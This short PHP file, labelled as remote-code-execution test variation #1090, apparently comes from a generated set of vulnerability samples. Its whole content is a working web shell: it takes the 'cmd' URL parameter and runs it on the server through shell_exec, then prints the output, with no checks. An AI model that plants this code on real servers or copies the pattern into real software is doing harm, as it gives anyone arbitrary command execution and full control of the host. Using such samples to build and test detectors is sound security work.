<?php
// RCE test variation #1090
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>